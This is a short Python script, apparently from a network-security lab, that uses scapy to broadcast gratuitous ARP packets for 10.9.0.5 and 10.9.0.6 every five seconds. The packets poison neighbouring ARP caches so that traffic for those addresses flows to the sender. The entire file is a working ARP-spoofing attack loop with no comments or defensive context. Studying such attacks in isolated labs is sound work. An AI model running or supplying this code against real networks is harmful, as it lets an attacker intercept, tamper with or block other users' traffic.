#!/usr/bin/env python3

from scapy.all import *
import schedule
import time

def some_job():
    arp = ARP(psrc="10.9.0.5", pdst="10.9.0.5", hwdst="ff:ff:ff:ff:ff:ff")
    eth = Ether(dst="ff:ff:ff:ff:ff:ff") / arp
    sendp(eth)

    arp = ARP(psrc="10.9.0.6", pdst="10.9.0.6", hwdst="ff:ff:ff:ff:ff:ff")
    eth = Ether(dst="ff:ff:ff:ff:ff:ff") / arp
    sendp(eth)

schedule.every(5).seconds.do(some_job)

while True:
    schedule.run_pending()
    time.sleep(1)